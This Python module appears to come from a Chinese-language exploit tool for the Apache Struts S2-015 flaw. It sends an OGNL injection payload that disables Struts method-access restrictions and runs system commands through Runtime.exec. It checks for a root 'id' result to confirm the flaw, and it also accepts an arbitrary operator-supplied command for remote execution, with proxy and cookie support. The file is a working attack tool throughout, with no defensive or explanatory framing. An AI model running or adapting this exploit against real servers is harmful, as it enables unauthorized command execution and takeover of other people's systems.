import requests
import re
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import hashlib
import urllib

cdd=''
http = ''
https = ''
cmd=''
dq1=''
url2=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd,dq1,url2
    global http, https,cmd
    h = re.match('.*/.*/(.*?\.action)', url1)
    if h != None:
        url2 = url1.replace(h.group(1), '')
    else:
        url2 = url1
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc1 = "%24%7B%23context['xwork.MethodAccessor.denyMethodExecution']%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('CMD').getInputStream())%2C%23q%7D.action"
            poc2=poc1.replace('CMD',cmd)
            aa = requests.get(url2+poc2, headers=headers, proxies=proxies, verify=False, timeout=15,cookies=s_cookie)
            cdd = urllib.parse.unquote(aa.text)
            cmd=''
        else:
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc = "%24%7B%23context['xwork.MethodAccessor.denyMethodExecution']%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())%2C%23q%7D.action"
            aa = requests.post(url2+poc, headers=headers, proxies=proxies, verify=False, timeout=15,cookies=s_cookie)
            acd = urllib.parse.unquote(aa.text)
            if 'groups=0' in acd:
                cdd = '[+]漏洞存在\n执行命令：id\n匹配关键词：groups=0\n'+acd
            else:
                cdd = '[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-015 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1